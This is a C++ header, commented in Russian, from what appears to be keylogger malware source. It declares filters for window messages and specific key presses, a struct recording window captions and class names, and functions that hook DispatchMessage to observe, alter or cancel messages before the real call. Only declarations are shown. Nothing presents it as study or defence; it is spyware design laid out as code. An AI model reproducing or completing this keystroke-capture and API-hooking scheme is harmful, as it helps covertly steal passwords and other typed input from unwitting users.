#pragma once

#include "core.h"

namespace KeyLogger
{

//дополнительная информация по окну
struct InfoWnd
{
	StringBuilderStack<256> caption;
	StringBuilderStack<256> nameClass;
	uint hashCaption;
	uint hashNameClass;
};

struct FilterMsgParams
{
	HWND hwnd;
	uint msg;
	WPARAM wparam;
	LPARAM lparam;
	bool ansi;
	POINT* pt;
	InfoWnd* infoWnd;
	bool _stop; //true если в хуке должен прекратиться вызов обработчиков, если был вызван до вызова реальной функций, 
				//то при stop = true можно отменить вызов реальной функции, при этом в _ret должно быть установлено возвращаемое значение
	DWORD _ret; //возвращаемое значение реальной функции
	bool _update; //true если нужно параметры были изменены, они будут использованы при вызове реальной функции (только в случае если фильтр вызван до реальной функции)
};

//фильтр проверки сообщений
class FilterMsgBase
{
	public:

		FilterMsgBase();
		~FilterMsgBase();
		virtual bool Check( FilterMsgParams& params );
};

//срабатывает на появление заданных сообщений
class FilterMsg : public FilterMsgBase
{
		uint* msgs; //на какие сообщения реагировать
		int c_msgs; //количество сообщений

	public:

		FilterMsg( const uint* _msgs, uint _c_msgs );
		~FilterMsg();
		virtual bool Check( FilterMsgParams& params );
};

//срабатывает на нажатие заданных клавиш
class FilterKey : public FilterMsg
{
		uint* keys; //на какие клавиши регировать
		int c_keys; //количество заданных клавиш

	public: 

		FilterKey( const uint* msgs, uint c_msgs, uint* _keys, int c_keys );
		~FilterKey();
		virtual bool Check( FilterMsgParams& params );
};

//срабатывает если все внутренние фильтры сработают (условие and)
class FilterMsgAnd : public FilterMsgBase
{
		FilterMsgBase* filters;
		int c_filters;

	public:

		FilterMsgAnd( const FilterMsgBase* _filters, int _c_filters );
		~FilterMsgAnd();
		virtual bool Check( FilterMsgParams& params );
};

//срабатывает если хоть один внутренний сработает (условие or)
class FilterMsgOr : public FilterMsgBase
{
		FilterMsgBase** filters;
		int c_filters;

	public:

		FilterMsgOr( const FilterMsgBase** _filters, int _c_filters );
		~FilterMsgOr();
		virtual bool Check( FilterMsgParams& params );
};

//выполяняет заданную процедуру при срабатывании фильтра сообщений
class ExecForFilterMsg
{
	protected:

		FilterMsgBase* filter;
		virtual void Exec( FilterMsgParams& params );

	public:

		ExecForFilterMsg( FilterMsgBase* _filter ) : filter(_filter)
		{
		}
		//выполнить при срабатывании фильтра
		void ExecCondition( FilterMsgParams& params );

};

//подключить фильтр к функции DispatchMessage (A, W), before = true - до выполнения реальной функции
bool JoinDispatchMessage( ExecForFilterMsg* filter, bool before = false );
//подключить фильтр к функции DispatchMessage (A, W), дополнительно заполняется структура InfoWnd, в JoinDispatchMessage это не выполняется
bool JoinDispatchMessageWnd( ExecForFilterMsg* filter, bool before = false );

}
